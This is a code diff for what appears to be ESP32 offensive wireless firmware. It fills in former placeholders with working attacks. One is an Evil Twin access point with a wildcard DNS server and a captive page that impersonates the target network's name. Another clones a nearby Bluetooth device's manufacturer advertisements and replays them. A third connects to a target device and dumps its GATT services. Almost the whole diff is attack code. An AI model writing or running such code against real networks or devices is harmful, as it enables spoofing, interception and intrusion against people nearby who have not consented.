@@ -339,6 +339,19 @@ void FireActivity::stopAttack() {
     // Restore normal frame validation
     s_bypassFrameCheck = false;
 
+#ifndef SIMULATOR
+    evilTwinDns.reset();
+    evilTwinWeb.reset();
+
+    if (bleEnumClient) {
+        if (bleEnumConnected) bleEnumClient->disconnect();
+        delete bleEnumClient;
+        bleEnumClient = nullptr;
+    }
+    bleEnumConnected = false;
+    bleEnumDone = false;
+#endif
+
     // Stop all radio activity
     esp_wifi_set_promiscuous(false);
 
@@ -808,21 +821,109 @@ void FireActivity::tickEvilTwin() {
     apCfg.ap.max_connection = 4;
     esp_wifi_set_config(WIFI_IF_AP, &apCfg);
 
-    // TODO: Start DNS server + HTTP captive portal
-    // For now, just create the AP. Full portal integration
-    // would reuse CaptivePortalActivity's web server logic.
+#ifndef SIMULATOR
+    evilTwinDns = makeUniqueNoThrow<DNSServer>();
+    evilTwinWeb = makeUniqueNoThrow<WebServer>(80);
+    if (evilTwinDns && evilTwinWeb) {
+        esp_wifi_start();
+        evilTwinDns->start(53, "*", WiFi.softAPIP());
+        evilTwinWeb->on("/", HTTP_GET, [this]() {
+            char page[512];
+            snprintf(page, sizeof(page),
+                "<html><head><meta charset=utf-8>"
+                "<meta name='viewport' content='width=device-width'>"
+                "<title>%s</title></head><body>"
+                "<h2>%s</h2><p>Connecting to network...</p>"
+                "</body></html>", target->ssid, target->ssid);
+            evilTwinWeb->send(200, "text/html", page);
+        });
+        evilTwinWeb->onNotFound([this]() {
+            evilTwinWeb->sendHeader("Location", "http://192.168.4.1/");
+            evilTwinWeb->send(302, "text/plain", "");
+        });
+        evilTwinWeb->begin();
+    }
+#endif
 
     packetsSent = 1;
-    snprintf(statusLine, sizeof(statusLine), "Evil Twin active: \"%s\" (open, ch%d)",
+    snprintf(statusLine, sizeof(statusLine), "Evil Twin + portal active: \"%s\" (ch%d)",
              target->ssid, (int)apCfg.ap.channel);
 }
 
 void FireActivity::tickBleClone() {
-    // TODO: Read target BLE adv data from TargetDB and replay
-    // For now, just show placeholder
-    if (packetsSent > 0) return;
-    packetsSent = 1;
-    snprintf(statusLine, sizeof(statusLine), "BLE Clone: needs adv data capture in SCAN");
+#ifndef SIMULATOR
+    if (!target) return;
+
+    // Phase 1: if we have no adv data, do a quick BLE scan to capture it
+    if (target->bleAdvRawLen == 0) {
+        snprintf(statusLine, sizeof(statusLine), "Scanning for \"%s\" adv data...",
+                 target->name[0] ? target->name : "target");
+
+        BLEDevice::init("");
+        BLEScan* scan = BLEDevice::getScan();
+        if (!scan) return;
+        scan->setActiveScan(true);
+        BLEScanResults* results = scan->start(2, false); // 2-second scan
+        if (results) {
+            int count = results->getCount();
+            for (int i = 0; i < count; i++) {
+                BLEAdvertisedDevice dev = results->getDevice(i);
+                // Match by MAC
+                uint8_t devMac[6] = {};
+                sscanf(dev.getAddress().toString().c_str(),
+                       "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                       &devMac[0], &devMac[1], &devMac[2],
+                       &devMac[3], &devMac[4], &devMac[5]);
+                if (memcmp(devMac, target->mac, 6) == 0 && dev.haveManufacturerData()) {
+                    String mfg = dev.getManufacturerData();
+                    uint8_t totalLen = (uint8_t)std::min((int)mfg.length() + 2, 31);
+                    target->bleAdvRaw[0] = totalLen - 1;
+                    target->bleAdvRaw[1] = 0xFF; // manufacturer specific AD type
+                    memcpy(target->bleAdvRaw + 2, mfg.c_str(), totalLen - 2);
+                    target->bleAdvRawLen = totalLen;
+                    break;
+                }
+            }
+        }
+        scan->clearResults();
+
+        if (target->bleAdvRawLen == 0) {
+            snprintf(statusLine, sizeof(statusLine),
+                     "No mfg adv data found — target may not be advertising");
+            return;
+        }
+    }
+
+    // Phase 2: replay captured manufacturer data
+    unsigned long now = millis();
+    if (now - lastActionMs < 150) return;
+    lastActionMs = now;
+
+    BLEAdvertising* adv = BLEDevice::getAdvertising();
+    if (!adv) return;
+    adv->stop();
+
+    BLEAdvertisementData advData;
+    if (target->bleAdvRawLen >= 3) {
+        String mfgPayload(reinterpret_cast<const char*>(target->bleAdvRaw + 2),
+                          target->bleAdvRawLen - 2);
+        advData.setManufacturerData(mfgPayload);
+    }
+    if (target->name[0]) advData.setName(target->name);
+
+    uint8_t addr[6];
+    randomMAC(addr);
+    addr[0] |= 0xC0; // random static address
+
+    adv->setAdvertisementData(advData);
+    adv->start();
+    packetsSent++;
+
+    snprintf(statusLine, sizeof(statusLine),
+             "BLE Clone \"%s\": %lu adverts", target->name, (unsigned long)packetsSent);
+#else
+    snprintf(statusLine, sizeof(statusLine), "[SIM] BLE Clone: %lu", (unsigned long)packetsSent++);
+#endif
 }
 
 void FireActivity::tickBleSpam() {
@@ -902,10 +1003,69 @@ void FireActivity::tickBleSpam() {
 }
 
 void FireActivity::tickBleEnumerate() {
-    // TODO: Connect to target BLE device, discover services, dump
-    if (packetsSent > 0) return;
+#ifndef SIMULATOR
+    if (!target) return;
+    if (bleEnumDone) return;
+
+    if (!bleEnumClient) {
+        BLEDevice::init("");
+        bleEnumClient = BLEDevice::createClient();
+        if (!bleEnumClient) {
+            snprintf(statusLine, sizeof(statusLine), "BLE Enumerate: OOM creating client");
+            bleEnumDone = true;
+            return;
+        }
+    }
+
+    if (!bleEnumConnected) {
+        snprintf(statusLine, sizeof(statusLine), "Connecting to \"%s\"...",
+                 target->name[0] ? target->name : "target");
+        char macStr[18];
+        snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
+                 target->mac[0], target->mac[1], target->mac[2],
+                 target->mac[3], target->mac[4], target->mac[5]);
+        BLEAddress addr(macStr);
+        bleEnumConnected = bleEnumClient->connect(addr, 0xFF, 5000);
+        if (!bleEnumConnected) {
+            snprintf(statusLine, sizeof(statusLine),
+                     "BLE Enumerate: connect failed (public addr)");
+            bleEnumDone = true;
+            return;
+        }
+    }
+
+    // One-shot: dump service UUIDs + characteristic counts
+    auto* svcs = bleEnumClient->getServices();
+    int svcCount = svcs ? (int)svcs->size() : 0;
+    snprintf(resultLine, sizeof(resultLine), "%d service(s) found", svcCount);
+
+    if (svcs) {
+        int n = 0;
+        for (auto& [uuid, svc] : *svcs) {
+            if (n >= 4) break;
+            auto* chars = svc->getCharacteristics();
+            int cCount = chars ? (int)chars->size() : 0;
+            char line[48];
+            snprintf(line, sizeof(line), "\n  %s (%d)", uuid.c_str(), cCount);
+            size_t used = strlen(resultLine);
+            if (used + strlen(line) < sizeof(resultLine) - 1)
+                strncat(resultLine, line, sizeof(resultLine) - used - 1);
+            n++;
+        }
+    }
+
+    bleEnumClient->disconnect();
+    bleEnumConnected = false;
+    bleEnumDone = true;
     packetsSent = 1;
-    snprintf(statusLine, sizeof(statusLine), "BLE Enumerate: connect + GATT dump (TODO)");
+    state = RESULTS;
+    stopAttack();
+    requestUpdate();
+#else
+    snprintf(statusLine, sizeof(statusLine), "[SIM] BLE Enumerate stub");
+    packetsSent = 1;
+    bleEnumDone = true;
+#endif
 }
 
 void FireActivity::tickAirtagSwarm() {
@@ -1063,6 +1223,13 @@ void FireActivity::loop() {
                 case ATK_AIRTAG_SWARM:      tickAirtagSwarm(); break;
                 default: break;
             }
+
+#ifndef SIMULATOR
+            if (activeAttack == ATK_EVIL_TWIN) {
+                if (evilTwinDns) evilTwinDns->processNextRequest();
+                if (evilTwinWeb) evilTwinWeb->handleClient();
+            }
+#endif
 
             // Display throttle
             unsigned long now = millis();
